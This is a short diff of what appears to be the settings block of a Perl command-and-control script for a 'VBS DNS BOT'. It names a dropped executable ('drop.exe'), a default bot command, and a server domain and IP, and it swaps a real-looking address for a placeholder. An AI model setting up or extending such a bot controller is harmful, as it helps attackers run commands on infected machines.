@@ -25,7 +25,7 @@
  $EGG="drop.exe";                   # File to DROP (VBS DNS BOT)
  $defaultcmd="ipconfig";            # default bot command
  $DOMAIN="dom.ws";                  # domain !!! need to be changed
- $IPA="54.194.143.85";              # ip address !!! need to be changed
+ $IPA="11.11.11.11";                # ip address of our server !!! need to be changed
  $timeout=60*10;                    # timeout
  ###############################################
  ###############################################
